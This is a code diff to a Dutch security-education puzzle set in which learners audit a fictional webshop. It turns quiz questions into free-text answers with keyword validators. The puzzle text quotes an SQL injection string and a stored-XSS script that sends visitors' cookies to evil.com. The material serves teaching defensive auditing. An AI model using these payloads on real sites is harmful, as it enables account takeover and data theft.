@@ -7,6 +7,16 @@ const config: PuzzleLabConfig = {
     introTitle: 'Security Auditor',
     introDescription:
         'De webshop van FreshDrop gaat morgen live — maar de eigenaar maakt zich zorgen over de beveiliging. Jij bent ingeschakeld als junior security auditor. Vind de kwetsbaarheden voordat een hacker dat doet. Ethisch hacken: beschermen, niet breken.',
+    experienceDesign: {
+        boringRisk: 'low',
+        firstTenSeconds: 'Kies je auditspoor: OWASP-finding, ernstclassificatie of professioneel rapport.',
+        primaryInteraction: 'solve-puzzle',
+        feedbackMoment: 'Feedback koppelt elke finding aan bescherming en herstel, niet aan aanvalssensatie.',
+        visualKit: 'review-puzzle-feedback',
+        evidenceMoment: 'Je bewijs bestaat uit kwetsbaarheidsherkenning, ernstclassificatie en een verdedigingsrapport.',
+        antiBoringRule: 'Security-audit blijft ethisch en herstelgericht: beschermen, niet breken.',
+        chromeAcceptance: 'Eerste routekeuze en safe-recovery panel tonen de beschermende auditrol zonder fear-based visuals.',
+    },
     introFeatures: [
         'Controleer een website op de meest voorkomende kwetsbaarheden',
         'Leer de OWASP Top 10 kennen op een begrijpelijk niveau',
@@ -18,9 +28,9 @@ const config: PuzzleLabConfig = {
         {
             id: 'owasp-herkennen',
             title: 'Welke kwetsbaarheid is dit?',
-            type: 'multiple-choice',
+            type: 'code-crack',
             description:
-                'Je test het zoekformulier van FreshDrop. In het zoekveld typ je:\n\n```\n\' OR \'1\'=\'1\n```\n\nDe webshop geeft plotseling de VOLLEDIGE klantendatabase terug — namen, e-mails en adressen van alle klanten.\n\nWat voor kwetsbaarheid heb je ontdekt?',
+                'Je test het zoekformulier van FreshDrop. In het zoekveld staat deze invoer:\n\n```\n\' OR \'1\'=\'1\n```\n\nDe webshop geeft plotseling de volledige klantendatabase terug: namen, e-mails en adressen van alle klanten.\n\nTyp de naam van de kwetsbaarheid die je hebt ontdekt.',
             clues: [
                 'De website stuurt je invoer rechtstreeks naar de database zonder het te controleren.',
                 'De invoer breekt de database-query: \' sluit een tekstveld af, OR \'1\'=\'1 is altijd waar.',
@@ -31,13 +41,8 @@ const config: PuzzleLabConfig = {
                 'Oplossing: gebruik "prepared statements" of "parameterized queries" — dan kan invoer nooit worden verward met database-code.',
             ],
             revealExtraAfterAttempts: 2,
-            options: [
-                'Cross-Site Scripting (XSS) — een script wordt in de pagina geïnjecteerd',
-                'SQL-injectie — invoer wordt als database-opdracht uitgevoerd',
-                'Brute force — het wachtwoord wordt geraden',
-                'CSRF — een gebruiker wordt misleid een actie uit te voeren',
-            ],
-            answer: 'SQL-injectie — invoer wordt als database-opdracht uitgevoerd',
+            answer: ['sql-injectie', 'sql injectie'],
+            validator: (input: string) => input.toLowerCase().includes('sql') && input.toLowerCase().includes('inject'),
             caseSensitive: false,
             maxAttempts: 3,
             points: 25,
@@ -48,9 +53,9 @@ const config: PuzzleLabConfig = {
         {
             id: 'ernst-classificatie',
             title: 'Classificeer de kwetsbaarheden',
-            type: 'multiple-choice',
+            type: 'text-input',
             description:
-                'Je hebt 3 kwetsbaarheden gevonden bij FreshDrop:\n\n**A.** De website heeft geen HTTPS — alle data (inclusief wachtwoorden) wordt onversleuteld verstuurd.\n**B.** De foutmeldingen tonen interne server-informatie (databaseversie, bestandspaden).\n**C.** De "over ons"-pagina heeft een typefout in de tekst.\n\nWelke heeft de hoogste ernst-classificatie?',
+                'Je hebt 3 kwetsbaarheden gevonden bij FreshDrop:\n\n**A.** De website heeft geen HTTPS — alle data, inclusief wachtwoorden, wordt onversleuteld verstuurd.\n**B.** De foutmeldingen tonen interne server-informatie: databaseversie en bestandspaden.\n**C.** De "over ons"-pagina heeft een typefout in de tekst.\n\nTyp welke finding de hoogste ernst heeft en waarom. Begin met A, B of C.',
             clues: [
                 'Ernst hangt af van de impact als een aanvaller misbruik maakt.',
                 'Onversleuteld verkeer betekent dat iedereen op hetzelfde netwerk mee kan lezen — ook wachtwoorden.',
@@ -61,13 +66,11 @@ const config: PuzzleLabConfig = {
                 'Geen HTTPS is "Kritiek" op een webshop: creditcardnummers en inloggegevens reizen onbeveiligd over het netwerk.',
             ],
             revealExtraAfterAttempts: 2,
-            options: [
-                'B — serverinfo lekt stiekem informatie die aanvallers kunnen gebruiken',
-                'A — geen HTTPS betekent alle data wordt onversleuteld verstuurd',
-                'C — een typefout trekt klanten weg die de site onprofessioneel vinden',
-                'Ze zijn even ernstig — alle beveiligingsproblemen zijn gelijk',
-            ],
-            answer: 'A — geen HTTPS betekent alle data wordt onversleuteld verstuurd',
+            answer: [],
+            validator: (input: string) => {
+                const s = input.toLowerCase();
+                return (s.trim().startsWith('a') || s.includes('https')) && (s.includes('onversleuteld') || s.includes('wachtwoord') || s.includes('data'));
+            },
             caseSensitive: false,
             maxAttempts: 3,
             points: 25,
@@ -78,9 +81,9 @@ const config: PuzzleLabConfig = {
         {
             id: 'xss-scenario',
             title: 'Wat is het risico van dit script?',
-            type: 'multiple-choice',
+            type: 'code-crack',
             description:
-                'Je test de beoordelingen-sectie van FreshDrop. Je plaatst als recensie:\n\n```html\n<script>document.location=\'https://evil.com/steal?c=\'+document.cookie</script>\n```\n\nDe webshop slaat de recensie op en toont hem aan alle bezoekers. Wanneer iemand de pagina bezoekt, wordt het script uitgevoerd.\n\nWat kan een aanvaller hiermee bereiken?',
+                'Je test de beoordelingen-sectie van FreshDrop. Een review bevat dit script:\n\n```html\n<script>document.location=\'https://evil.com/steal?c=\'+document.cookie</script>\n```\n\nDe webshop slaat de recensie op en toont hem aan alle bezoekers. Wanneer iemand de pagina bezoekt, wordt het script uitgevoerd.\n\nTyp het risico in je eigen woorden: wat kan hiermee worden gestolen of overgenomen?',
             clues: [
                 'Het script wordt uitgevoerd IN de browser van de bezoeker — op de echte FreshDrop-pagina.',
                 'document.cookie bevat de sessiecookies van de ingelogde bezoeker.',
@@ -91,13 +94,11 @@ const config: PuzzleLabConfig = {
                 'Met gestolen sessiecookies kan de aanvaller inloggen alsof hij de bezoeker is — zonder wachtwoord nodig te hebben.',
             ],
             revealExtraAfterAttempts: 2,
-            options: [
-                'De aanvaller kan de webshop-server overnemen en bestanden verwijderen',
-                'De aanvaller steelt de sessiecookies van bezoekers en kan hun accounts overnemen',
-                'De aanvaller kan alleen de layout van de pagina aanpassen',
-                'Het script werkt niet want browsers blokkeren altijd externe scripts',
-            ],
-            answer: 'De aanvaller steelt de sessiecookies van bezoekers en kan hun accounts overnemen',
+            answer: [],
+            validator: (input: string) => {
+                const s = input.toLowerCase();
+                return (s.includes('cookie') || s.includes('sessie')) && (s.includes('account') || s.includes('overnemen') || s.includes('stelen'));
+            },
             caseSensitive: false,
             maxAttempts: 3,
             points: 25,
